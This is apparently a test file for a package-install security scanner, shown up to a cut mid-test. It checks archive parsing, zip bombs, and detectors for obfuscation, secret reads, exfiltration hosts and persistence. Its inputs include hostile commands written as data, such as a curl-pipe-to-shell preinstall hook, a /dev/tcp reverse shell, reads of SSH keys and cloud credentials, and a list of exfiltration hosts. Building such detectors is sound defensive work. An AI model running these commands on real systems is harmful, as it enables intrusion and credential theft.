// Package content analysis: archives read safely, each detector, grading, the version diff, integrity, the cache,
// offline and registry trouble, the sandbox run, and legitimate shapes that must not be stopped. Archives are built in
// memory from test/fixtures/packages (defanged, see its README) and served by a fake registry: nothing here reaches a
// real registry, and nothing in a package runs outside the sandbox.
import { describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { existsSync, lstatSync, mkdtempSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, relative, sep } from "node:path";
import { deflateRawSync, gzipSync } from "node:zlib";
import { LIMITS, readTar, readTgz, readZip, safePath, stripTop, writeTree } from "../src/sec/content/archive";
import { compareLoose, contentCheck, hookCommand, integrityOk, pickPyFile, previousVersion, readClean, sandboxHere, worthReading, analyseBytes } from "../src/sec/content";
import { grade, takenOver, type Analysis } from "../src/sec/content/grade";
import { hookTargets, hostKind, mask, scanPackage, type Kind } from "../src/sec/content/scan";
import { checkInstall, npmManifest, pkgCheckCommand, pkgCommand, plan, pypiProject, type Fetcher } from "../src/sec/pkg";

const tmp = (tag: string) => mkdtempSync(join(tmpdir(), `vs-content-${tag}-`));
const FIX = join(import.meta.dir, "fixtures", "packages");

// ── archives built in memory

interface F {
  path: string;
  data?: string | Buffer;
  mode?: number;
  type?: "0" | "1" | "2" | "3" | "5";
  link?: string;
}

function header(name: string, size: number, type: string, mode: number, link = ""): Buffer {
  const h = Buffer.alloc(512);
  h.write(name.slice(0, 100), 0);
  h.write(mode.toString(8).padStart(7, "0") + "\0", 100);
  h.write("0000000\0", 108);
  h.write("0000000\0", 116);
  h.write(size.toString(8).padStart(11, "0") + "\0", 124);
  h.write("00000000000\0", 136);
  h.write("        ", 148);
  h.write(type, 156);
  h.write(link.slice(0, 100), 157);
  h.write("ustar\0", 257);
  h.write("00", 263);
  let sum = 0;
  for (const b of h) sum += b;
  h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
  return h;
}

function tar(files: F[]): Buffer {
  const parts: Buffer[] = [];
  for (const f of files) {
    const data = Buffer.from(f.data ?? "");
    if (f.path.length > 100) {
      // A pax header carries the long name.
      const rec = (k: string, v: string) => {
        const body = ` ${k}=${v}\n`;
        let len = body.length + 1;
        while (`${len}${body}`.length !== len) len = `${len}${body}`.length;
        return `${len}${body}`;
      };
      const pax = Buffer.from(rec("path", f.path));
      parts.push(header("PaxHeader", pax.length, "x", 0o644), pax, Buffer.alloc((512 - (pax.length % 512)) % 512));
    }
    parts.push(header(f.path, f.type && f.type !== "0" ? 0 : data.length, f.type ?? "0", f.mode ?? 0o644, f.link));
    if (!f.type || f.type === "0") parts.push(data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  parts.push(Buffer.alloc(1024));
  return Buffer.concat(parts);
}

const tgz = (files: F[]) => gzipSync(tar(files));

/** A zip; `declared` lies about the uncompressed size (a bomb's trick), `symlink` marks a link. */
function zip(files: (F & { deflate?: boolean; declared?: number; symlink?: boolean })[]): Buffer {
  const local: Buffer[] = [], central: Buffer[] = [];
  let off = 0;
  for (const f of files) {
    const raw = Buffer.from(f.data ?? "");
    const data = f.deflate ? deflateRawSync(raw) : raw;
    const name = Buffer.from(f.path);
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0);
    lh.writeUInt16LE(20, 4);
    lh.writeUInt16LE(f.deflate ? 8 : 0, 8);
    lh.writeUInt32LE(data.length, 18);
    lh.writeUInt32LE(f.declared ?? raw.length, 22);
    lh.writeUInt16LE(name.length, 26);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0);
    ch.writeUInt16LE(0x031e, 4);
    ch.writeUInt16LE(20, 6);
    ch.writeUInt16LE(f.deflate ? 8 : 0, 10);
    ch.writeUInt32LE(data.length, 20);
    ch.writeUInt32LE(f.declared ?? raw.length, 24);
    ch.writeUInt16LE(name.length, 28);
    ch.writeUInt32LE(((f.symlink ? 0o120777 : 0o100644) << 16) >>> 0, 38);
    ch.writeUInt32LE(off, 42);
    local.push(lh, name, data);
    central.push(ch, name);
    off += 30 + name.length + data.length;
  }
  const cd = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(files.length, 8);
  end.writeUInt16LE(files.length, 10);
  end.writeUInt32LE(cd.length, 12);
  end.writeUInt32LE(off, 16);
  return Buffer.concat([...local, cd, end]);
}

/** A fixture folder as archive entries, under `top` (npm's package/, an sdist's name-version/, nothing for a wheel). */
// Fixtures put together at run time instead of kept as files: Defender on a Windows checkout took the curl-pipe
// package.json for an npm stealer and deleted it.
const BUILT: Record<string, () => Record<string, string>> = {
  "curl-pipe": () => ({
    "package.json": JSON.stringify({
      name: "vs-fixture-cli-setup", version: "0.1.0", description: "Installs a CLI (test fixture)", license: "MIT",
      scripts: { preinstall: ["cu", "rl -fsSL https://get.example.invalid/install.sh", " | ", "sh"].join("") },
    }, null, 2) + "\n",
  }),
};

function filesOf(name: string, top = "package"): F[] {
  const built = BUILT[name]?.();
  if (built) return Object.entries(built).map(([path, data]) => ({ path: (top ? `${top}/` : "") + path, data: Buffer.from(data), mode: 0o644 }));
  const root = join(FIX, name);
  const out: F[] = [];
  const walk = (d: string) => {
    for (const e of readdirSync(d).sort()) {
      const p = join(d, e);
      if (lstatSync(p).isDirectory()) walk(p);
      else out.push({ path: (top ? `${top}/` : "") + relative(root, p).split(sep).join("/"), data: readFileSync(p), mode: statSync(p).mode & 0o777 });
    }
  };
  walk(root);
  return out;
}

const npmTgz = (name: string) => tgz(filesOf(name));
const analyse = (buf: Buffer, kind: Kind, name = "x", version = "1.0.0", file?: string): Analysis =>
  analyseBytes(buf, { eco: kind === "npm" ? "npm" : "pip", name, version, file }, kind);
const sri = (b: Buffer) => `sha512-${createHash("sha512").update(b).digest("base64")}`;

// ── a fake registry

interface Pub {
  name: string;
  version: string;
  bytes: Buffer;
  publisher?: string;
  maintainers?: string[];
  provenance?: boolean;
  at?: number;
  integrity?: string;
  scripts?: Record<string, string>;
}

function registry(pubs: Pub[], opt: { down?: RegExp; py?: { name: string; version: string; filename: string; bytes: Buffer; packagetype: string; at?: number }[] } = {}) {
  const calls: string[] = [];
  const tarballUrl = (p: Pub) => `https://registry.npmjs.org/${p.name}/-/${p.name.split("/").pop()}-${p.version}.tgz`;
  const json = (status: number, body: any) => ({ status, json: async () => body });
  const get: Fetcher = async (url) => {
    calls.push(url);
    if (opt.down?.test(url)) throw new Error("getaddrinfo ENOTFOUND");
    const u = new URL(url);
    for (const p of pubs) if (url === tarballUrl(p)) return { status: 200, json: async () => ({}), arrayBuffer: async () => p.bytes.buffer.slice(p.bytes.byteOffset, p.bytes.byteOffset + p.bytes.length) as ArrayBuffer };
    for (const f of opt.py ?? []) if (url === `https://files.pythonhosted.org/packages/ab/cd/${f.filename}`) return { status: 200, json: async () => ({}), arrayBuffer: async () => f.bytes.buffer.slice(f.bytes.byteOffset, f.bytes.byteOffset + f.bytes.length) as ArrayBuffer };
    if (u.host === "registry.npmjs.org") {
      const [, enc, ver] = /^\/([^/]+)\/([^/]+)$/.exec(u.pathname) ?? [];
      const name = decodeURIComponent(enc ?? "");
      const list = pubs.filter((p) => p.name === name);
      const p = ver === "latest" ? list.at(-1) : list.find((x) => x.version === ver);
      if (!p) return json(404, {});
      return json(200, {
        name, version: p.version, scripts: p.scripts ?? JSON.parse(readTgzJson(p.bytes)).scripts ?? {},
        dist: { tarball: tarballUrl(p), integrity: p.integrity ?? sri(p.bytes), ...(p.provenance ? { attestations: { url: "x", provenance: { predicateType: "https://slsa.dev/provenance/v1" } } } : {}) },
        _npmUser: { name: p.publisher ?? "alice" }, maintainers: (p.maintainers ?? [p.publisher ?? "alice"]).map((n) => ({ name: n })),
      });
    }
    if (u.host === "api.npmjs.org") return json(200, { downloads: 12 });
    if (u.host === "api.deps.dev") {
      if (url.includes(":dependencies")) return json(200, { nodes: [{ versionKey: { name: "root", version: "1" } }], edges: [] });
      if (url.includes("versionbatch")) return json(200, { responses: [] });
      const name = decodeURIComponent(/packages\/([^/]+)$/.exec(u.pathname)?.[1] ?? "");
      return json(200, { versions: pubs.filter((p) => p.name === name).map((p) => ({ versionKey: { version: p.version }, publishedAt: new Date(p.at ?? Date.now() - 400 * 86_400_000).toISOString() })) });
    }
    if (u.host === "pypi.org") {
      const name = /^\/pypi\/([^/]+)\/json$/.exec(u.pathname)?.[1];
      const files = (opt.py ?? []).filter((f) => f.name === name);
      if (!files.length) return json(404, {});
      const releases: Record<string, any[]> = {};
      for (const f of files) (releases[f.version] ??= []).push({ filename: f.filename, url: `https://files.pythonhosted.org/packages/ab/cd/${f.filename}`, packagetype: f.packagetype, digests: { sha256: createHash("sha256").update(f.bytes).digest("hex") }, size: f.bytes.length, upload_time_iso_8601: new Date(f.at ?? Date.now() - 400 * 86_400_000).toISOString() });
      return json(200, { info: { version: files.at(-1)!.version }, releases, urls: releases[files.at(-1)!.version] });
    }
    return json(404, {});
  };
  return { get, calls };
}

/** package.json out of a .tgz, for the fake manifest. */
function readTgzJson(b: Buffer): string {
  const e = stripTop(readTgz(b)).entries.find((x) => x.path === "package.json");
  return e?.data?.toString("utf8") ?? "{}";
}

/** An OSV cache that already knows these versions are clean, so no test asks api.osv.dev. */
function osvCache(dir: string, pkgs: string[]) {
  const f = join(dir, "osv.json");
  writeFileSync(f, JSON.stringify(Object.fromEntries(pkgs.map((p) => [p, { at: Date.now(), mal: [] }]))));
  return f;
}

const copt = (get: Fetcher, dir: string, extra: object = {}) => ({ get, manifest: (n: string, v: string) => npmManifest(n, v, get), pypi: (n: string) => pypiProject(n, get), dir, verbose: true, ...extra });
const rules = (fs: { id: string; severity: string }[]) => fs.map((f) => `${f.id.split(":").slice(0, 3).join(":")}:${f.severity}`);

describe("archives are read without trusting them", () => {
  test("names: absolute paths, drive letters, .. and backslash tricks are refused", () => {
    expect(safePath("package/index.js")).toBe("package/index.js");
    expect(safePath("./package//lib/./a.js")).toBe("package/lib/a.js");
    for (const bad of ["/etc/passwd", "../x", "package/../../x", "C:\\Windows\\x", "package\\..\\..\\x", "a\0b", ""]) expect(safePath(bad)).toBeUndefined();
  });

  test("a tarball with traversal, links and a device: nothing of it leaves the folder, all of it is reported", () => {
    const a = readTar(tar([
      { path: "package/package.json", data: '{"name":"t","version":"1.0.0"}' },
      { path: "package/../../.zshrc", data: "evil" },
      { path: "/etc/cron.d/x", data: "evil" },
      { path: "package/link", type: "2", link: "../../../../home/u/.ssh/id_rsa" },
      { path: "package/inside", type: "2", link: "lib/a.js" },
      { path: "package/hard", type: "1", link: "/etc/passwd" },
      { path: "package/dev", type: "3" },
      { path: `package/${"deep/".repeat(30)}long-name.js`, data: "module.exports = 1;" },
    ]));
    expect(a.entries.map((e) => e.path).sort()).toEqual([`package/${"deep/".repeat(30)}long-name.js`, "package/package.json"]);
    expect(a.problems.filter((p) => p.kind === "traversal").map((p) => p.path).sort()).toEqual(["/etc/cron.d/x", "package/../../.zshrc"]);
    expect(a.problems.filter((p) => p.kind === "link").map((p) => /outside/.test(p.detail!))).toEqual([true, false, true]);
    expect(a.problems.some((p) => p.kind === "special")).toBe(true);
    // The grade says so.
    const g = grade({ meta: { eco: "npm", name: "t", version: "1.0.0" }, scanned: scanPackage(stripTop(a), "npm") });
    expect(rules(g)).toEqual(expect.arrayContaining(["pkg:content:traversal:high", "pkg:content:links:medium", "pkg:content:entries:low"]));
  });

  test("writing to disk (for the sandbox) creates only regular files inside the folder", () => {
    const root = tmp("tree");
    const a = stripTop(readTar(tar([
      { path: "package/a.js", data: "1" }, { path: "package/a.js", data: "2" }, { path: "package/bin/run", data: "#!/bin/sh\n", mode: 0o755 }, { path: "package/l", type: "2", link: "/etc" },
    ])));
    writeTree(a, root);
    // The last entry of a name wins, as with tar.
    expect(readFileSync(join(root, "a.js"), "utf8")).toBe("2");
    // Windows keeps no execute bit.
    if (process.platform !== "win32") expect(statSync(join(root, "bin/run")).mode & 0o100).toBe(0o100);
    expect(existsSync(join(root, "l"))).toBe(false);
  });

  test("zip bombs and size limits: gzip and deflate stop at the cap, counts stop at the cap", () => {
    const lim = { ...LIMITS, maxUnpacked: 1_000_000 };
    const bomb = gzipSync(tar([{ path: "package/zeros", data: Buffer.alloc(5_000_000) }]));
    expect(bomb.length).toBeLessThan(20_000);
    const a = readTgz(bomb, lim);
    expect(a.partial).toContain("more than 1 MB");
    expect(a.entries).toEqual([]);
    // A zip entry that inflates past the size it declares is cut there and reported.
    const z = readZip(zip([{ path: "big.py", data: Buffer.alloc(3_000_000, 0x41), deflate: true, declared: 1000 }]), lim);
    expect(z.problems.map((p) => p.kind)).toContain("damaged");
    // Declared sizes count too.
    expect(readZip(zip([{ path: "a.py", data: "x", declared: 2_000_000 }]), lim).partial).toContain("more than 1 MB");
    const many = readTar(tar(Array.from({ length: 50 }, (_, i) => ({ path: `package/f${i}.js`, data: "1" }))), { ...LIMITS, maxFiles: 10 });
    expect(many.partial).toContain("more than 10 files");
    // A deadline in the past stops reading.
    expect(readTar(tar(Array.from({ length: 600 }, (_, i) => ({ path: `p/f${i}`, data: "" }))), { ...LIMITS, deadline: 0 }).partial).toContain("time");
  });

  test("garbage is a damaged archive, never a crash", () => {
    expect(readTgz(Buffer.from("not gzip")).partial).toBeDefined();
    expect(readZip(Buffer.from("PK nonsense")).partial).toBeDefined();
    const t = tar([{ path: "package/a.js", data: "x" }]);
    t[148] = 0x39; // checksum broken
    expect(readTar(t).problems[0].kind).toBe("damaged");
    expect(readTar(tar([{ path: "a", data: "x".repeat(600) }]).subarray(0, 700)).partial).toContain("cut short");
    expect(readZip(zip([{ path: "a/", data: "" }, { path: "l", data: "/etc/passwd", symlink: true }])).problems[0].kind).toBe("link");
  });

  test("a tar size field that is not a number, or a bad checksum, ends the read as damaged; the next file is never silently lost", () => {
    const next = tar([{ path: "package/b.js", data: "require('child_process').exec('curl x|sh')" }]);
    // What the review did: a first header whose size is not octal, then a normal entry.
    const bad = (field: string | Buffer) => Buffer.concat([withField(header("package/a.js", 0, "0", 0o644), 124, field), next]);
    for (const field of ["zzzzzzzzzzz\0", "12zz\0\0\0\0\0\0\0\0", "-0000000001\0", Buffer.from([0xff, ...Array(11).fill(0xff)])]) {
      const a = readTar(bad(field));
      expect([String(field), a.partial]).toEqual([String(field), "the archive is damaged"]);
      expect(a.problems.find((p) => p.kind === "damaged")?.detail).toContain("size field");
      expect(a.entries.map((e) => e.path)).toEqual([]);
    }
    // The checksum field the same way: not octal is not a header.
    expect(readTar(Buffer.concat([withField(header("package/a.js", 0, "0", 0o644), 148, "zzzzzz\0 ", false), next])).problems[0]).toMatchObject({ kind: "damaged", detail: expect.stringContaining("checksum") });
    // GNU base-256 sizes are read (top bit set, big-endian).
    const b256 = Buffer.alloc(12);
    b256[0] = 0x80;
    b256[11] = 5;
    const a = readTar(Buffer.concat([withField(header("package/c.js", 0, "0", 0o644), 124, b256), Buffer.from("hello"), Buffer.alloc(507), Buffer.alloc(1024)]));
    expect(a.partial).toBeUndefined();
    expect(a.entries.map((e) => [e.path, e.size, e.data?.toString()])).toEqual([["package/c.js", 5, "hello"]]);
  });

  test("pax size, path and linkpath decide the entry, as npm's node-tar and pip's tarfile read it", () => {
    // The header says 0 bytes; the pax record says 40: an installer reads 40, and so does vswarm.
    const body = "require('child_process').exec('curl x')";
    const t = Buffer.concat([...paxEntry({ size: String(body.length), path: "package/install.js" }), header("package/x", 0, "0", 0o644), pad(body), Buffer.alloc(1024)]);
    const a = readTar(t);
    expect(a.partial).toBeUndefined();
    expect(a.entries.map((e) => [e.path, e.size, e.data?.toString()])).toEqual([["package/install.js", body.length, body]]);
    // linkpath names a link's target.
    const l = readTar(Buffer.concat([...paxEntry({ linkpath: "../../../../etc/passwd" }), header("package/l", 0, "2", 0o777, "harmless"), Buffer.alloc(1024)]));
    expect(l.problems[0]).toMatchObject({ kind: "link", detail: expect.stringContaining("/etc/passwd (outside the package)") });
    // A pax size that is not a number, a malformed record, or a global header moving paths: damaged, read no further.
    expect(readTar(Buffer.concat([...paxEntry({ size: "12x" }), header("package/x", 0, "0", 0o644), Buffer.alloc(1024)])).partial).toBe("the archive is damaged");
    const broken = Buffer.from("99 path=x\n");
    expect(readTar(Buffer.concat([header("PaxHeader", broken.length, "x", 0o644), pad(broken), header("package/x", 0, "0", 0o644), Buffer.alloc(1024)])).partial).toBe("the archive is damaged");
    const g = readTar(Buffer.concat([...paxEntry({ path: "evil.js" }, "g"), ...tarParts([{ path: "package/a.js", data: "1" }])]));
    expect(g.problems[0].detail).toContain("global pax header sets path");
    // A global header with only a comment (git archive writes one) is fine.
    expect(readTar(Buffer.concat([...paxEntry({ comment: "4b83a48" }, "g"), ...tarParts([{ path: "package/a.js", data: "1" }])])).partial).toBeUndefined();
  });

  test("zip: a local header that names another file, two entries for one path, a non-UTF-8 name: damaged, as pip would read them differently", () => {
    const z = zip([{ path: "pkg/a.py", data: "x = 1" }]);
    // The local header names a .pth (pip refuses the entry; other unzippers unpack that name). Same length, so offsets stay.
    const swapped = Buffer.from(z);
    swapped.write("pkg/a.pt", 30);
    expect(readZip(swapped).problems.find((p) => p.kind === "damaged")?.detail).toContain("local header names");
    expect(readZip(swapped).partial).toBe("the archive is damaged");
    const dup = readZip(zip([{ path: "pkg/a.py", data: "x = 1" }, { path: "pkg/./a.py", data: "import os" }]));
    expect(dup.problems.map((p) => p.detail)).toContain("a second entry for the same path: which one counts depends on the tool that unpacks it");
    expect(dup.partial).toBeDefined();
    const latin = readZip(zip([{ path: "pkg/é.py", data: "x" }]));
    expect(latin.problems[0].detail).toContain("code page 437");
    // A clean wheel stays clean.
    expect(readZip(zip([{ path: "pkg/a.py", data: "x", deflate: true }, { path: "pkg/b.py", data: "y" }]))).toMatchObject({ partial: undefined, problems: [] });
  });

  test("a damaged or partial read is never cached as clean: the guard reads it again next time", async () => {
    expect(readClean({ problems: [{ kind: "damaged", path: "" }] })).toBe(false);
    expect(readClean({ problems: [{ kind: "link", path: "x" }] })).toBe(true);
    expect(readClean({ partial: "ran out of time", problems: [] })).toBe(false);
    const d = tmp("damaged");
    const real = tar([{ path: "package/package.json", data: '{"name":"vs-fixture-damaged","version":"1.0.0"}' }, { path: "package/index.js", data: "module.exports = 1;" }]);
    const bytes = gzipSync(Buffer.concat([withField(header("package/a.js", 0, "0", 0o644), 124, "zzzzzzzzzzz\0"), real]));
    const reg = registry([{ name: "vs-fixture-damaged", version: "1.0.0", bytes, at: Date.now() - 3_600_000 }]);
    const cache = osvCache(d, ["npm:vs-fixture-damaged@1.0.0", "npm:root@1"]);
    for (let i = 0; i < 2; i++) {
      const r = await checkInstall(plan("npm", ["install", "vs-fixture-damaged@1.0.0"], d), { get: reg.get, osvCache: cache });
      expect(r.findings.map((f) => f.id)).toContain("pkg:content:damaged:npm:vs-fixture-damaged@1.0.0");
    }
    expect(reg.calls.filter((u) => u.endsWith(".tgz")).length).toBe(2);
  });
});

/** A header with one field replaced (bytes at `at`), and its checksum made right again unless `resum` is false. */
function withField(h: Buffer, at: number, field: string | Buffer, resum = true): Buffer {
  const out = Buffer.from(h);
  const f = Buffer.from(field);
  f.copy(out, at);
  if (resum) {
    out.write("        ", 148);
    let sum = 0;
    for (const b of out) sum += b;
    out.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
  }
  return out;
}

const pad = (d: string | Buffer) => {
  const b = Buffer.from(d);
  return Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512)]);
};

/** A pax header (x, or g for global) with these records. */
function paxEntry(recs: Record<string, string>, type = "x"): Buffer[] {
  const body = Buffer.from(Object.entries(recs).map(([k, v]) => {
    const rest = ` ${k}=${v}\n`;
    let len = rest.length + 1;
    while (`${len}${rest}`.length !== len) len = `${len}${rest}`.length;
    return `${len}${rest}`;
  }).join(""));
  return [header("PaxHeader", body.length, type, 0o644), pad(body)];
}

/** tar() as a list of parts, to follow headers built by hand. */
const tarParts = (files: F[]) => [tar(files)];

describe("detectors", () => {
  const one = (files: Record<string, string>, kind: Kind = "npm") =>
    scanPackage({ entries: Object.entries(files).map(([path, d]) => ({ path, size: d.length, mode: 0o644, head: Buffer.from(d.slice(0, 8)), data: Buffer.from(d) })), problems: [], total: 0 }, kind);
  const cats = (s: ReturnType<typeof one>) => [...new Set(s.signals.map((x) => `${x.where}:${x.cat}${x.hostKind ? `:${x.hostKind}` : ""}`))].sort();
  const pj = (scripts: object) => JSON.stringify({ name: "t", version: "1.0.0", scripts });

  test("install hooks: npm scripts lead to the files they run, and everything those require", () => {
    const s = one({ "package.json": pj({ postinstall: "node ./lib/a.js && echo ok" }), "lib/a.js": "require('./b')", "lib/b.js": "require('https')", "index.js": "require('https')" });
    expect(s.hooks).toEqual([{ name: "postinstall", cmd: "node ./lib/a.js && echo ok" }]);
    expect(s.installFiles).toEqual(["lib/a.js", "lib/b.js"]);
    expect(cats(s)).toEqual(["import:network", "install:network"]);
    expect(hookTargets(`node -e "require('./x')" ; sh ./setup.sh; FOO=1 python3 scripts/p.py --flag`)).toEqual({ files: ["setup.sh", "scripts/p.py"], inline: ["require('./x')"] });
    // binding.gyp without its own install script means node-gyp rebuild, and its <!(…) commands run.
    const g = one({ "package.json": pj({}), "binding.gyp": `{"x": ["<!(node -p \\"require('node-addon-api').include\\")", "<!(curl -s https://x.example.invalid/a | sh)"]}` });
    expect(g.hooks[0].cmd).toContain("node-gyp rebuild");
    expect(cats(g)).toEqual(["install:gyp", "install:host:plain", "install:network", "install:pipe-shell"]);
  });

  test("obfuscation: decode-and-run, obfuscator.io names, code past the edge of the screen, encoded blobs, packed lines", () => {
    const cases: [string, string][] = [
      ["eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString())", "exec-decoded"],
      ["new Function(atob(x))()", "exec-decoded"],
      ["require('vm').runInThisContext(Buffer.from(p, 'hex').toString())", "exec-decoded"],
      ["const c = Buffer.from(s, 'base64').toString(); eval(c)", "exec-maybe"],
      [Array.from({ length: 40 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)}=${i};`).join(""), "obfuscated"],
      ["const a = 1;" + " ".repeat(400) + "require('child_process').exec('id')", "hidden"],
      [`const p = "${Buffer.alloc(900, 7).toString("base64")}";`, "blob"],
      [`const h = "${"\\x41".repeat(100)}";`, "blob"],
    ];
    for (const [code, cat] of cases) expect(cats(one({ "package.json": pj({}), "index.js": code }))).toContain(`import:${cat}`);
    expect(cats(one({ "setup.py": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n" }, "sdist"))).toContain("install:exec-decoded");
    expect(cats(one({ "a/__init__.py": "exec(__import__('zlib').decompress(b'x'))\n" }, "wheel"))).toContain("import:exec-decoded");
    expect(cats(one({ "a/__init__.py": "from cryptography.fernet import Fernet\nexec(Fernet(k).decrypt(b'gAAAA'))\n" }, "wheel"))).toContain("import:exec-decoded");
    // Embedded WebAssembly, data URIs and source maps are ordinary.
    expect(cats(one({ "package.json": pj({}), "w.js": `const w = "AGFzbQ${"A".repeat(900)}";\nconst i = "data:image/png;base64,${"B".repeat(900)}";` }))).toEqual([]);
    // A bundle's long lines say nothing; a long line in a package of readable files does.
    const minified = "var a=1;".repeat(1000);
    expect(cats(one({ "package.json": pj({}), "dist/x.min.js": minified, "dist/y.js": minified }))).toEqual([]);
    expect(cats(one({ "package.json": pj({}), "lib/a.js": "module.exports = 1;\n".repeat(200), "lib/b.js": "module.exports = 2;\n".repeat(200), "index.js": minified }))).toContain("import:dense");
  });

  test("secrets: key and credential paths, browser and wallet data, the keychain, token files, environment dumps", () => {
    const s = (code: string) => cats(one({ "package.json": pj({ postinstall: "node i.js" }), "i.js": code }));
    for (const code of [
      "fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'))",
      "read(home + '/.aws/credentials')",
      "glob('Library/Application Support/Google/Chrome/Default/Login Data')",
      "x('nkbihfbeogaeaoehlefnkodbefgpgknn')",
      "execSync('security find-generic-password -s Chrome')",
      "read('C:\\\\Users\\\\x\\\\.ssh\\\\id_ed25519')",
    ]) expect(s(code)).toContain("install:secrets");
    expect(s("read(path.join(home, '.npmrc'))")).toContain("install:secrets-weak");
    expect(s("send(JSON.stringify(process.env))")).toContain("install:env-dump");
    expect(s("const t = process.env.NPM_TOKEN")).toContain("install:token-env");
    expect(cats(one({ "setup.py": "import json, os\nbody = json.dumps(dict(os.environ))\n" }, "sdist"))).toContain("install:env-dump");
    // In a comment it is nothing.
    expect(s("// reads ~/.ssh/id_rsa? no: see https://203.0.113.9/docs")).toEqual([]);
  });

  test("network and hosts: APIs, drop boxes, raw IPs, IP lookups, DNS built from data", () => {
    expect(hostKind("discord.com/api/webhooks/1/x")).toBe("exfil");
    expect(hostKind("api.telegram.org/bot123:abc/sendMessage")).toBe("exfil");
    expect(hostKind("abc.ngrok-free.app")).toBe("exfil");
    expect(hostKind("webhook.site/x")).toBe("exfil");
    expect(hostKind("api.ipify.org")).toBe("recon");
    expect(hostKind("203.0.113.9")).toBe("ip");
    expect(hostKind("registry.npmjs.org")).toBe("benign");
    expect(hostKind("exfil.example.invalid")).toBe("plain");
    for (const quiet of ["127.0.0.1", "10.1.2.3", "192.168.1.1", "8.8.8.8", "999.1.1.1", "localhost"]) expect(hostKind(quiet)).toBeUndefined();
    const s = (code: string) => cats(one({ "package.json": pj({ postinstall: "node i.js" }), "i.js": code }));
    expect(s("require('https').request({ hostname: 'collector.example.invalid' })")).toEqual(["install:host:plain", "install:network"]);
    expect(s("fetch('http://203.0.113.9:8080/x')")).toEqual(["install:host:ip", "install:network"]);
    expect(s("require('dns').lookup(data + '.x.example.invalid', () => {})")).toContain("install:dns-exfil");
    // OIDs and versions are not addresses.
    expect(s("const cn = '2.5.4.3', v = '1.2.3.4';")).toEqual([]);
    expect(cats(one({ "setup.py": "import urllib.request\nurllib.request.urlopen('http://203.0.113.7/x')\n" }, "sdist"))).toEqual(["install:host:ip", "install:network"]);
  });

  test("download and run: curl | sh, iwr | iex, fetch then eval, download then chmod and spawn, background processes", () => {
    const s = (scripts: object, code = "") => cats(one({ "package.json": pj(scripts), "i.js": code }));
    expect(s({ preinstall: "curl -fsSL https://get.example.invalid/x.sh | sh" })).toContain("install:pipe-shell");
    expect(s({ preinstall: "powershell -c \"iwr https://x.example.invalid/a.ps1 | iex\"" })).toContain("install:pipe-shell");
    expect(s({ postinstall: "node i.js" }, "fetch(u).then(r => r.text()).then(eval)")).toContain("install:pipe-shell");
    expect(s({ postinstall: "node i.js" }, "require('child_process'); fs.chmodSync(p, 0o755); spawn(p, [], { detached: true }).unref()")).toEqual(["install:chmod", "install:detached", "install:proc"]);
    expect(s({ postinstall: "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1" })).toContain("install:pipe-shell");
  });

  test("persistence: login items, shell files (only when written), cron, systemd, Windows Run keys", () => {
    const s = (code: string) => cats(one({ "package.json": pj({ postinstall: "node i.js" }), "i.js": code }));
    for (const code of ["write(home + '/Library/LaunchAgents/x.plist')", "exec('crontab -l | { cat; echo x; } | crontab -')", "mkdir(home + '/.config/systemd/user')", "exec('reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v x')", "fs.appendFileSync(path.join(home, '.zshrc'), line)"])
      expect(s(code)).toContain("install:persistence");
    // Naming a shell file without writing it is not persistence.
    expect(s("const rc = path.join(home, '.zshrc'); console.log(rc)")).toEqual([]);
  });

  test("wheels: .pth import lines run at every start; the modules they import count as install-time code", () => {
    const s = one({ "x.pth": "import x_boot\n", "x_boot.py": "import urllib.request\nurllib.request.urlopen('https://c.example.invalid')\n", "x/__init__.py": "" }, "wheel");
    expect(s.hooks.map((h) => h.name)).toEqual([".pth"]);
    expect(s.installFiles).toEqual(["x.pth", "x_boot.py"]);
    expect(cats(s)).toEqual(["install:host:plain", "install:network", "install:pth"]);
    // setuptools' distutils switch and namespace shims are known and quiet.
    const ok = one({ "distutils-precedence.pth": "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n", "paths.pth": "/opt/lib\n" }, "wheel");
    expect(ok.signals).toEqual([]);
  });

  test("tests, docs and examples never run, and are not read", () => {
    expect(cats(one({ "package.json": pj({}), "test/steal.js": "eval(atob(x)); read('~/.ssh/id_rsa')", "docs/x.py": "exec(base64.b64decode(x))", "a.spec.js": "eval(atob(y))" }))).toEqual([]);
  });

  test("evidence is masked: tokens and payloads are not repeated", () => {
    expect(mask("const t = 'ghp_abcdefghijklmnopqrstuvwxyz0123456789'")).not.toContain("ghp_abc");
    expect(mask(`x = "${"QUJD".repeat(30)}"`)).toContain("…(120 chars)");
    const s = one({ "package.json": pj({ postinstall: "node i.js" }), "i.js": `eval(atob("${"QUJD".repeat(300)}"))` });
    expect(s.signals.find((x) => x.cat === "exec-decoded")!.text.length).toBeLessThan(170);
    expect(s.signals.find((x) => x.cat === "exec-decoded")).toMatchObject({ file: "i.js", line: 1 });
  });
});

describe("grading: where code runs and what it combines", () => {
  const sev = (name: string, kind: Kind = "npm") => {
    const a = kind === "npm" ? analyse(npmTgz(name), "npm", name) : kind === "sdist" ? analyse(tgz(filesOf(name, `${name}-0.0.3`)), "sdist", name, "0.0.3", `${name}-0.0.3.tar.gz`) : analyse(zip(filesOf(name, "")), "wheel", name, "1.0.0", `${name}-1.0.0-py3-none-any.whl`);
    return rules(grade(a));
  };

  test("defanged malware shapes are stopped", () => {
    expect(sev("colors-v2")).toEqual(expect.arrayContaining(["pkg:content:steal:high"]));
    expect(sev("obfuscated-lib")).toEqual(expect.arrayContaining(["pkg:content:m-exec:high", "pkg:content:m-obfuscated:medium"]));
